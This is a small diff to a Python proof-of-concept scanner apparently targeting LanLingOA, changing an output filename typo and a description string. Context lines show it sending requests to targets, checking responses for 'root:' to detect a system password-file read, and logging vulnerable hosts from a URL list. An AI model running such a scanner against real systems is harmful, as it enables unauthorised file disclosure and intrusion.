@@ -28,7 +28,7 @@ def poc(target):
         response = requests.post(url, data=data, headers=headers, verify=False, timeout=10)
         if "root:" in response.text and response.status_code == 200:
             print(f"[+] {target} is vulable")
-            with open("resulet.txt", "a+", encoding="utf-8") as f:
+            with open("result.txt", "a+", encoding="utf-8") as f:
                 f.write(target+"\n")
             return True
         else:
@@ -40,7 +40,7 @@ def poc(target):
         return False
 def main():
     banner()
-    parser = argparse.ArgumentParser(description='lanlingOA POC')
+    parser = argparse.ArgumentParser(description='LanLingOA POC')
     parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
     parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
     args = parser.parse_args()
